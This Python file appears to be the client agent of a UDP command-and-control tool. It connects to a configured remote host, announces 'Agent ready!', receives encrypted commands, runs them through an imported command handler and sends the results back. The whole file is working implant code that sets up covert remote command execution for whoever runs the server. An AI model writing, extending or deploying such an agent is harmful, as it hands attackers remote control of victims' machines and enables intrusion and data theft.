import asyncio
from config import Config
from protocol import UDPC2Protocol
from commands import CommandHandler

class ClientUDPC2Protocol(UDPC2Protocol):
    def __init__(self, config, command_handler):
        super().__init__(config, is_server=False)
        self.command_handler = command_handler
        self.initial_sent = False

    def connection_made(self, transport):
        super().connection_made(transport)
        if not self.initial_sent:
            self.send_message("Agent ready!")
            print("[Client] Initial message sent: Agent ready!")
            self.initial_sent = True

    def datagram_received(self, data, addr):
        command = super().datagram_received(data, addr)
        if command:
            print(f"[Client] Received command from {addr}: {command}")
            result = self.command_handler.execute(command)
            print(f"[Client] Command result: {result}")
            self.send_message(result)
        else:
            print(f"[Client] Failed to decrypt message from {addr}")

async def main():
    config = Config()
    command_handler = CommandHandler()
    print(f"[Client] Connecting to {config.client_host}:{config.client_port}...")

    loop = asyncio.get_running_loop()
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: ClientUDPC2Protocol(config, command_handler),
        remote_addr=(config.client_host, config.client_port),
    )

    try:
        await asyncio.Future()  
    finally:
        transport.close()

if __name__ == "__main__":
    asyncio.run(main())